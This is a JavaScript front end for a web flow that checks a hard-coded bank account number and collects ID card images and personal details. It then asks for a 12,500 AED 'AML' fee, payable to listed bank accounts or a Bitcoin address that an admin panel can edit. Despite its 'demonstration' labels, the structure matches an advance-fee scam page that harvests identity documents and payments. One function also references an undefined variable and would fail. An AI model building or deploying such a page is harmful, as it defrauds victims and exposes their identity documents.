
// ======================================
// 1. APPLICATION DATA
// ======================================

let transaction = {};


// ======================================
// 2. PAGE NAVIGATION
// ======================================

const pages = [
    "accountPage",
    "uploadPage",
    "successPage",
    "transferPage",
    "promptPage",
    "instructionPage",
    "paymentPage",
    "noticePage"
];



let pageTransitionTimer;

function showPage(pageName, addHistory = true) {

    let target = document.getElementById(pageName);
    let loader = document.getElementById("globalLoader");

    if (!target || !loader || !pages.includes(pageName)) {
        console.log("Page not found:", pageName);
        return;
    }

    // Add the page to browser history
    if (addHistory) {
        history.pushState(
            { page: pageName },
            "",
            "#" + pageName
        );
    }

    // Stop any previous page transition
    if (pageTransitionTimer) {
        clearTimeout(pageTransitionTimer);
    }

    // Hide all pages
    pages.forEach(function(page) {
        document.getElementById(page).classList.add("d-none");
    });

    // Show spinner
    loader.classList.remove("d-none");

    // Wait 1 second
    pageTransitionTimer = setTimeout(function() {

        // Hide spinner
        loader.classList.add("d-none");

        // Show the next page
        target.classList.remove("d-none");

        pageTransitionTimer = null;

    }, 1000);
}


// Set the first visible page as the starting history entry
let initialPage = pages.find(function(page) {
    return !document.getElementById(page).classList.contains("d-none");
}) || pages[0];

history.replaceState(
    { page: initialPage },
    "",
    "#" + initialPage
);


// Listen for browser Back and Forward buttons
window.addEventListener("popstate", function(event) {

    if (event.state && event.state.page) {

        // false means don't create another history entry
        showPage(event.state.page, false);

    }

});



// ======================================
// 3. ACCOUNT NUMBER CHECK
// ======================================

function checkAccount() {

    let accountNumber =
        document.getElementById("accountNumber").value.trim();

    let error =
        document.getElementById("accountError");

    if (accountNumber === "") {

        error.innerText = "Enter your account number.";

        return;

    }

    if (accountNumber === "102411529802") {

        error.innerText = "";

        transaction = {
            accountNumber: accountNumber,
            customerName: "Irina"
        };

        saveTransaction();

        showPage("uploadPage");

    } else {

        error.innerText = "Account number not recognized.";

    }

}


// ======================================
// 4. IMAGE PREVIEW
// ======================================

function previewImage(event, previewID) {

    let file = event.target.files[0];

    let preview =
        document.getElementById(previewID);

    if (!file) return;

    if (!file.type.startsWith("image/")) {

        alert("Please select an image.");

        event.target.value = "";

        return;

    }

    if (file.size > 3 * 1024 * 1024) {

        alert("Image must be below 3MB.");

        event.target.value = "";

        return;

    }

    preview.src = URL.createObjectURL(file);

    preview.classList.remove("d-none");

}


// ======================================
// 5. DEMONSTRATION VERIFICATION
// ======================================


function startVerification(event) {

    // Prevent the form from refreshing the page
    event.preventDefault();

    // Get the selected sample images
    let frontID = document.getElementById("frontID").files[0];
    let backID = document.getElementById("backID").files[0];

    // Check that both images are selected
    if (!frontID || !backID) {
        alert("Please select both sample images.");
        return;
    }

    // Get the form information for this demo session
    let verificationDetails = {
        fullName: document.getElementById("fullName").value,
        address: document.getElementById("address").value,
        phone: document.getElementById("phone").value,
        email: document.getElementById("email").value
    };

    console.log(verificationDetails);

    // Mark the demonstration step as completed
    transaction.verificationStatus = "Demo completed";

    saveTransaction();

    // Move to the next page with your 3-second spinner
    showPage("successPage");
}


// ======================================
// 6. TRANSFER AMOUNT
// ======================================



function showPrompt() {

    let amountText = document.getElementById("transferAmount").innerText;

    // Remove commas before converting to number
    let amount = Number(amountText.replace(/,/g, "").trim());

    if (isNaN(amount) || amount <= 0) {
        alert("Invalid amount");
        return;
    }

    transaction.amount = amount;

    document.getElementById("confirmAmount").innerText =
        formatMoney(amount);

    saveTransaction();

    showPage("promptPage");
}




// ======================================
// 7. FORMAT MONEY
// ======================================

function formatMoney(amount) {

    return new Intl.NumberFormat("en-AE", {

        style: "currency",

        currency: "AED"

    }).format(amount);

}


// ======================================
// 8. DEFAULT GATEWAY INFORMATION
// ======================================

let defaultGatewayData = {

    fee: Number(12500),

    chime: {

        name: "Chime Gateway",

        reference: "CHIME-AML-102",

        account: "169118600868",

        accountName: "AML-Payment",

        description: "Chime Payment Details."

    },

    olajuwon: {

        name: "Emirate NBD Gateway",

        reference: "NBD-PAY-205",

        account: "169054307560",

        accountName: "AML-Payment",

        description: "Emirate NBD Payment Details."

    },

    crypto: {

        name: "Cryptocurrency Gateway",

        reference: "CRYPTO-PAY-BTC",

        account: "1Bh4zjCT2Ry6FvksGRpSFDexS68fDxZqqy",

        accountName: "AML Wallet",

        description: "cryptocurrency payment details."

    }

};


// LOAD SAVED GATEWAY INFORMATION

let gatewayData = JSON.parse(
    localStorage.getItem("gatewayData")
) || defaultGatewayData;


// ======================================
// 9. SHOW PAYMENT GATEWAY
// ======================================

function displayGateway() {

    let method =
        document.getElementById("paymentMethod").value;

    let details =
        document.getElementById("gatewayDetails");

    if (!method) {

        details.classList.add("d-none");

        return;

    }

    let selected = gatewayData[method];

    document.getElementById("gatewayName").innerText =
        selected.name;

    document.getElementById("gatewayReference").innerText =
        selected.reference;

    document.getElementById("gatewayAccount").innerText =
        selected.account;

    document.getElementById("gatewayAccountName").innerText =
        selected.accountName;

    document.getElementById("gatewayDescription").innerText =
        selected.description;

    document.getElementById("displayFee").innerText =
        formatMoney(Number(gatewayData.fee));

    details.classList.remove("d-none");

    transaction.selectedGateway = method;

    saveTransaction();

}


// ======================================
// 10. EDIT GATEWAY SETTINGS
// ======================================

function loadGatewayEditor() {

    let method =
        document.getElementById("editGateway").value;

    let selected = gatewayData[method];

    document.getElementById("editFee").value =
        gatewayData.fee;

    document.getElementById("editName").value =
        selected.name;

    document.getElementById("editReference").value =
        selected.reference;

    document.getElementById("editAccount").value =
        selected.account;

    document.getElementById("editAccountName").value =
        selected.accountName;

    document.getElementById("editDescription").value =
        selected.description;

}


// SAVE ADMIN CHANGES

function updateGateway() {

    let method =
        document.getElementById("editGateway").value;

    let fee = Number(feeText.replace(/,/g, "").trim());

    if (feeText.trim() === "" || !Number.isFinite(fee) || fee < 0) {

        alert("Enter a valid demonstration fee.");

        return;
    }

    gatewayData.fee = fee;

    gatewayData[method] = {

        name: document.getElementById("editName").value,

        reference: document.getElementById("editReference").value,

        account: document.getElementById("editAccount").value,

        accountName: document.getElementById("editAccountName").value,

        description: document.getElementById("editDescription").value

    };

    localStorage.setItem(
        "gatewayData",
        JSON.stringify(gatewayData)
    );

    document.getElementById("adminMessage").innerText =
        "Settings saved successfully!";

    loadGatewayEditor();

}


// ======================================
// 11. SUBMISSION BUTTON
// ======================================

function paymentSubmitted() {

    if (!transaction.selectedGateway) {

        alert("Select a demonstration gateway first.");

        return;

    }

    transaction.submissionStatus =
        "Demo submission received — not payment verified";

    saveTransaction();

    showPage("noticePage");

}


// ======================================
// 12. SAVE TRANSACTION
// ======================================

function saveTransaction() {

    localStorage.setItem(
        "olajuwonDemoTransaction",
        JSON.stringify(transaction)
    );

}


// ======================================
// 13. INITIALIZE ADMIN EDITOR
// ======================================

document.getElementById("editGateway")
    .addEventListener("change", loadGatewayEditor);

loadGatewayEditor();
